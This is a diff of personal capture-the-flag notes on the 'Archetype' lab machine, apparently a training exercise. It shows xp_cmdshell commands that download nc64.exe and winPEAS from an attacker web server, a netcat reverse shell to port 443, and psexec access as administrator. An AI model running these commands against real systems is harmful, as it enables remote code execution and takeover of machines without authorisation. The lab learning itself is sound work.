@@ -77,7 +77,7 @@ ________________________________________________________________________________
             python3 mssqlclient.py -h
 ________________________________________________________________________________________________________________________
 
-""" Got a connection! """
+    " Got a connection! "
 pythonn3 mssqlclient.py ARCHETYPE/sql_svc@10.129.79.20 -windows-auth
 Impacket v0.13.0.dev0+20250814.3907.9282c9bb - Copyright Fortra, LLC and its affiliated companies
 
@@ -124,26 +124,26 @@ ________________________________________________________________________________
   NULL
 ________________________________________________________________________________________________________________________
 
-""" MY STUPID ASS DIDN'T PUT THE .exe FILE IN THE PYTHON SO NO MATTER HOW MANY HIT YOU GET THERE IS NO FILE SO HOW ARE YOU GOING TO GET THE SHELL?? """
-                                  """MAKE SURE ALL THE THINGS YOU NEED ARE ACCESSIBLE VIA THE VICTIM """
+   " MY STUPID ASS DIDN'T PUT THE .exe FILE IN THE PYTHON SO NO MATTER HOW MANY HIT YOU GET THERE IS NO FILE SO HOW ARE YOU GOING TO GET THE SHELL?? "
+                                  " MAKE SURE ALL THE THINGS YOU NEED ARE ACCESSIBLE VIA THE VICTIM  "
 ________________________________________________________________________________________________________________________
 
   ┌──(kali㉿kali)-[/var/www/html]
   └─$ ls
   index.html  index.nginx-debian.html  nc64.exe  winPEASx64.exe
 
-""" MORE STUPIDLY MY FILE DIDN'T GET DOWNLOADED WHILE HITTING THE PYTHON SERVER BECAUSE YOU WEREN'T IN WWW """
+  " MORE STUPIDLY MY FILE DIDN'T GET DOWNLOADED WHILE HITTING THE PYTHON SERVER BECAUSE YOU WEREN'T IN WWW "
 ________________________________________________________________________________________________________________________
 
 ### Downloading and executing ###
 
-""" hit on python server! """
+   " hit on python server! "
 SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://ip/nc64.exe -outfile nc64.exe"
 
-""" hit exe file for nxc """
+   " hit exe file for nxc "
 
 xp_cmdshell "cmd /c C:\Users\sql_svc\Downloads\nc64.exe -e cmd.exe ip 443"
-""" Got a Hit """ : 
+  " Got a Hit " : 
         ─$ nc -lvnp 443
         listening on [any] 443 ...
         connect to [...ip...] from (UNKNOWN) [...target machine...] 49679
@@ -154,12 +154,12 @@ ________________________________________________________________________________
 
 ### Post Exploitation ###
 
-""" changing directory """
+  " changing directory "
 
   C:\Windows\system32>cd C:\Users\sql_svc\Desktop
   cd C:\Users\sql_svc\Desktop
 
-""" listing directory """
+  " listing directory "
 
   C:\Users\sql_svc\Desktop>dir
   dir
@@ -175,7 +175,7 @@ ________________________________________________________________________________
                2 Dir(s)  10,725,150,720 bytes free
 ________________________________________________________________________________________________________________________
 
-""" reading the contents """
+  " reading the contents "
 
         C:\Users\sql_svc\Desktop>type user.txt
         type user.txt
@@ -188,12 +188,12 @@ ________________________________________________________________________________
 
 ### Installation ###
 
-"""installing winPEAS on victim system """
+  "installing winPEAS on victim system "
 
               C:\Users\sql_svc\Desktop>powershell -c Invoke-WebRequest http://<ip>:80/winPEASx64.exe -OutFile winPEASx64.exe
               powershell -c Invoke-WebRequest http://<ip>:80/winPEASx64.exe -OutFile winPEASx64.exe
 
-""" Success! """
+  " Success! "
 
             C:\Users\sql_svc\Desktop>dir
             dir
@@ -224,8 +224,8 @@ We will read the PowerShell history file, which is the equivalent of bash_histor
 ________________________________________________________________________________________________________________________
 
 ### Shell ###
-"""We can now use the tool psexec.py again from the Impacket suite to """ 
-         """ get a shell as the administrator: """
+  "We can now use the tool psexec.py again from the Impacket suite to " 
+           " get a shell as the administrator: "
 
 ┌──(kali㉿kali)-[~/Documents/Archetype/impacket/examples]
 └─$ python3 psexec.py administrator@<ip>
